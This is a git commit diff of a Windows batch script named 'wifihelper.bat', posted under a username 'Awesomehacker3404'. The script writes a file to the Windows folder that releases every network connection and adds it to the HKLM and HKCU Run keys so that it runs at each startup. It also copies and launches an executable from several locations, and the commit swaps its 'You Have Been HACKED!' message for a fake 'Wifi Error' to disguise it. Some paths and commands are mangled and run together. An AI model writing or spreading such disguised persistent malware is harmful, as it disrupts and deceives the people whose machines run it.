d891f5ef5713db8e834c1cb7e74c987862694084
Awesomehacker3404 <48257718+Awesomehacker3404@users.noreply.github.com>
2019-03-05 11:28:29 -0700

    Update wifihelper.bat
    Move to Program Files before starting

--- wifihelper.bat
+++ wifihelper.bat
@@ -3,15 +3,16 @@ echo break off>c:windowswimn32.bat echo
 ipconfig/release_all>c:windowswimn32.bat
 echo end>c:windowswimn32.batreg add
 hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
-hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho Wifi Error
 
-Copy C:\programs\wifihelper.exe C:\Windows
+Copy C:\Program Files\wifihelper.exe C:\Users\Default.Migrated\Documents\
+Copy C:\Program Files\wifihelper.exe C:\Windows
 Copy C:\Windows\wifihelper.exe C:\Users\Public
 
-Start C:\programs\wifihelper.exe
+Start C:\Program Files\wifihelper.exe
 Start C:\Windows\wifihelper.exe
 Start C:\Users\Public\wifihelper.exe
 
-exit C:\programs\wifihelper.exe
+exit C:\Program Files\wifihelper.exe
 exit C:\Windows\wifihelper.exe
 exit C:\Users\Public\wifihelper.exe
